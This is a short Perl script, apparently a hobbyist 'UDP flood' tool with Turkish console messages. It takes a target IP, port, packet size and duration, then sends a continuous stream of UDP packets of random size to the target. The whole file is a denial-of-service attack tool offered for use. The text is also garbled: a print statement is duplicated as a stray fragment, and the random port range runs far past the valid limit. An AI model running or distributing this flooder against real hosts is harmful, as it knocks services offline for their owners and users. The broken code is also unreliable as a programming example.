#!/usr/bin/perl

##
# Eronmay34 udp flood script
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Host adi cozumlenemiyor. $ip\n";
$endtime = time() + ($time ? $time : 99999999);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "Eronmay34";
print "UDP Flooder Script";

 print           "              Sald�rd�g�n IP : $ip
			Saldiriliyor su porta " .
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
Talk shit get FaRted On. ") . "\n";
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
Talk shit get FaRted On. ") . "\n";
        print "Durdurmak i�in Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(6550000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}
